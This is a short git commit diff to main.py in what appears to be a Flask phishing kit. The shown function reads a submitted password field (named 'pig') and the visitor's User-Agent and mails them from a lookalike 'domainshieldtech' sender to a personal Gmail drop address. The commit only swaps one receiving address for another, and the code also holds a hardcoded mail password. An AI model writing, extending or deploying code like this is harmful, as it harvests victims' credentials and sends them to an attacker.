8f9bf936699e2a2071e3af7e536dd6cc3cadda36
raina8 <147160392+raina8@users.noreply.github.com>
2024-10-22 10:14:17 -0700

    Update main.py

--- main.py
+++ main.py
@@ -219,7 +219,7 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'fabio508ants@gmail.com'
+        receiver_email = 's.toihidi@gmail.com'
         password = 'vip5071dc7bc887'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
